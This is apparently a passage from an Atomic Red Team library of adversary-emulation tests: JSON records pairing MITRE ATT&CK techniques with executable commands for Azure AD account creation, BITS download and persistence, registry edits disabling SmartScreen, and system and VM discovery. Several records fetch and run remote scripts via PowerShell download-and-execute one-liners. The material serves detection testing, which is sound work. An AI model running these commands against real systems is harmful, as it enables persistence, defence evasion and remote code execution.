				"default": "reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if AzureAD PowerShell module is installed",
				"prereq_command": "Get-InstalledModule -Name AzureAD",
				"get_prereq_command": "echo \"use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force\""
			},
			{
				"description": "Check if AzureAD PowerShell module is installed",
				"prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
				"get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
			}
		],
		"executor": {
			"command": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\n$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile\n$PasswordProfile.Password = $password\nNew-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      ",
			"cleanup_command": "Remove-AzureADUser -ObjectId \"#{userprincipalname}\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1136.003",
		"phases": ["persistence"]
	},
	{
		"name": "Azure AD - Create a new user via Azure CLI",
		"auto_generated_guid": "228c7498-be31-48e9-83b7-9cb906504ec8",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Display name of the new user to be created in Azure AD",
				"type": "string",
				"default": "atomicredteam"
			},
			"userprincipalname": {
				"description": "User principal name (UPN) for the new Azure user being created format email address",
				"type": "string",
				"default": "atomicredteam@yourdomain.com"
			},
			"password": {
				"description": "Password for the new Azure AD user being created",
				"type": "string",
				"default": "reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if Azure CLI is installed and install manually",
				"prereq_command": "az account list",
				"get_prereq_command": "echo \"use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows\""
			},
			{
				"description": "Check if Azure CLI is installed and install via PowerShell",
				"prereq_command": "az account list",
				"get_prereq_command": "echo \"use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi\""
			},
			{
				"description": "Update the userprincipalname to meet your requirements",
				"prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
				"get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
			}
		],
		"executor": {
			"command": "az login\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\naz ad user create --display-name $username --password $password --user-principal-name $userprincipalname\naz ad user list --filter \"displayname eq 'atomicredteam'\"     ",
			"cleanup_command": "az ad user delete --id",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1136.003",
		"phases": ["persistence"]
	},
	{
		"name": "Dynamic API Resolution-Ninja-syscall",
		"auto_generated_guid": "578025d5-faa9-4f6d-8390-aae739d507e1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_binary": {
				"description": "PE binary",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Portable Executable to run must exist at specified location (#{exe_binary})\n",
				"prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.007/bin/ninja_syscall1.exe\" -OutFile \"#{exe_binary}\"\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nif (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }\n",
			"cleanup_command": "if (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1027.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Bitsadmin Download (cmd)",
		"auto_generated_guid": "3c73d728-75fb-4180-a12f-6712864d7421",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "Remote file to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
			},
			"local_file": {
				"description": "Local file path to save downloaded file",
				"type": "path",
				"default": "%temp%\\bitsadmin1_flag.ps1"
			}
		},
		"executor": {
			"command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n",
			"cleanup_command": "del #{local_file} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1197",
		"phases": ["defense-evasion", "persistence"]
	},
	{
		"name": "Bitsadmin Download (PowerShell)",
		"auto_generated_guid": "f63b8bc4-07e5-4112-acba-56f646f3f0bc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "Remote file to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
			},
			"local_file": {
				"description": "Local file path to save downloaded file",
				"type": "path",
				"default": "$env:TEMP\\bitsadmin2_flag.ps1"
			}
		},
		"executor": {
			"command": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n",
			"cleanup_command": "Remove-Item #{local_file} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1197",
		"phases": ["defense-evasion", "persistence"]
	},
	{
		"name": "Persist, Download, & Execute",
		"auto_generated_guid": "62a06ec5-5754-47d2-bcfc-123d8314c6ae",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_path": {
				"description": "Path of command to execute",
				"type": "path",
				"default": "C:\\Windows\\system32\\notepad.exe"
			},
			"bits_job_name": {
				"description": "Name of BITS job",
				"type": "string",
				"default": "AtomicBITS"
			},
			"local_file": {
				"description": "Local file path to save downloaded file",
				"type": "path",
				"default": "%temp%\\bitsadmin3_flag.ps1"
			},
			"remote_file": {
				"description": "Remote file to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
			}
		},
		"executor": {
			"command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\nbitsadmin.exe /resume #{bits_job_name}\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete #{bits_job_name}\n",
			"cleanup_command": "del #{local_file} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1197",
		"phases": ["defense-evasion", "persistence"]
	},
	{
		"name": "Bits download using desktopimgdownldr.exe (cmd)",
		"auto_generated_guid": "afb5e09e-e385-4dee-9a94-6ee60979d114",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "Remote file to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
			},
			"download_path": {
				"description": "Local file path to save downloaded file",
				"type": "path",
				"default": "SYSTEMROOT=C:\\Windows\\Temp"
			},
			"cleanup_path": {
				"description": "path to delete file as part of cleanup_command",
				"type": "path",
				"default": "C:\\Windows\\Temp\\Personalization\\LockScreenImage"
			},
			"cleanup_file": {
				"description": "file to remove as part of cleanup_command",
				"type": "string",
				"default": "*.md"
			}
		},
		"executor": {
			"command": "set \"#{download_path}\" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n",
			"cleanup_command": "del #{cleanup_path}\\#{cleanup_file} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1197",
		"phases": ["defense-evasion", "persistence"]
	},
	{
		"name": "LockBit Black - Modify Group policy settings -cmd",
		"auto_generated_guid": "9ab80952-74ee-43da-a98c-1e740a985f28",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1484.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "LockBit Black - Modify Group policy settings -Powershell",
		"auto_generated_guid": "b51eae65-5441-4789-b8e8-64783c26c1d1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force\n",
			"cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore \nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1484.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "System Information Discovery",
		"auto_generated_guid": "66703791-c902-4560-8770-42b8a91f7667",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "System Information Discovery",
		"auto_generated_guid": "edff98ec-0f73-4f63-9890-6b117092aff6",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "system_profiler\nls -al /Applications\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "List OS Information",
		"auto_generated_guid": "cccb070c-df86-4216-a5bc-9fb60c74e27c",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "Output file used to store the results.",
				"type": "path",
				"default": "/tmp/T1082.txt"
			}
		},
		"executor": {
			"command": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n",
			"cleanup_command": "rm #{output_file} 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Linux VM Check via Hardware",
		"auto_generated_guid": "31dad7ad-2286-4c02-ae92-274418c85fec",
		"supported_platforms": ["linux"],
		"executor": {
			"elevation_required": true,
			"command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n",
			"name": "bash"
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Linux VM Check via Kernel Modules",
		"auto_generated_guid": "8057d484-0fae-49a4-8302-4812c4f1e64e",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "FreeBSD VM Check via Kernel Modules",
		"auto_generated_guid": "eefe6a49-d88b-41d8-8fc2-b46822da90d3",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "kldstat | grep -i \"vmm\"\nkldstat | grep -i \"vbox\"\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Hostname Discovery (Windows)",
		"auto_generated_guid": "85cfbf23-4a1e-4342-8792-007e004b975f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "hostname\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Hostname Discovery",
		"auto_generated_guid": "486e88ea-4f56-470f-9b57-3f4d73f39133",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "hostname\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Windows MachineGUID Discovery",
		"auto_generated_guid": "224b4daf-db44-404e-b6b2-f4d1f0126ef8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Griffon Recon",
		"auto_generated_guid": "69bd4abe-8759-49a6-8d21-0f15822d6370",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vbscript": {
				"description": "Path to sample script",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sample script file must exist on disk at specified location (#{vbscript})\n",
				"prereq_command": "if (Test-Path \"#{vbscript}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{vbscript}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs\" -OutFile \"#{vbscript}\"\n"
			}
		],
		"executor": {
			"command": "cscript \"#{vbscript}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Environment variables discovery on windows",
		"auto_generated_guid": "f400d1c0-1804-4ff8-b069-ef5ddd2adbf3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "set\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Environment variables discovery on freebsd, macos and linux",
		"auto_generated_guid": "fcbdd43f-f4ad-42d5-98f3-0218097e2720",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "env\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Show System Integrity Protection status (MacOS)",
		"auto_generated_guid": "327cc050-9e99-4c8e-99b5-1d15f2fb6b96",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "csrutil status\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - winPEAS",
		"auto_generated_guid": "eea1d918-825e-47dd-acc2-814d6c58c0e1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - itm4nprivesc",
		"auto_generated_guid": "3d256a2f-5e57-4003-8eb6-64d91b1da7ce",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - Powersploits privesc checks",
		"auto_generated_guid": "345cb8e4-d2de-4011-a580-619cf5a9e2d7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput",
			"cleanup_command": "rm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - General privesc checks",
		"auto_generated_guid": "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - GeneralRecon",
		"auto_generated_guid": "7804659b-fdbf-4cf6-b06a-c03e758590e8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - Morerecon",
		"auto_generated_guid": "3278b2f6-f733-4875-9ef4-bfed34244f0a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - RBCD-Check",
		"auto_generated_guid": "dec6a0d8-bcaf-4c22-9d48-2aee59fb692b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - PowerSharpPack - Watson searching for missing windows patches",
		"auto_generated_guid": "07b18a66-6304-47d2-bad0-ef421eb2e107",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors",
		"auto_generated_guid": "efb79454-1101-4224-a4d0-30c9c8b29ffc",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - PowerSharpPack - Seatbelt",
		"auto_generated_guid": "5c16ceb4-ba3a-43d7-b848-a13c1f216d95",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Azure Security Scan with SkyArk",
		"auto_generated_guid": "26a18d3d-f8bc-486b-9a33-d6df5d78a594",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "T1082Az"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The SkyArk AzureStealth module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"\n"
			},
			{
				"description": "The AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			},
			{
				"description": "The Az module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name Az -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      \n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n",
			"cleanup_command": "$resultstime = Get-Date -Format \"yyyyMMdd\"\n$resultsfolder = (\"Results-\" + $resultstime)\nremove-item $env:temp\\$resultsfolder -recurse -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Linux List Kernel Modules",
		"auto_generated_guid": "034fe21c-3186-49dd-8d5d-128b35f181c7",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "lsmod\nkmod list\ngrep vmw /proc/modules\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "FreeBSD List Kernel Modules",
		"auto_generated_guid": "4947897f-643a-4b75-b3f5-bed6885749f6",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "kldstat\nkldstat | grep vmm\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "System Information Discovery with WMIC",
		"auto_generated_guid": "8851b73a-3624-4bf7-8704-aa312411565c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "System Information Discovery",
		"auto_generated_guid": "4060ee98-01ae-4c8e-8aad-af8300519cc7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs\n",
			"elevation_required": true,
			"name": "command_prompt"
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Check computer location",
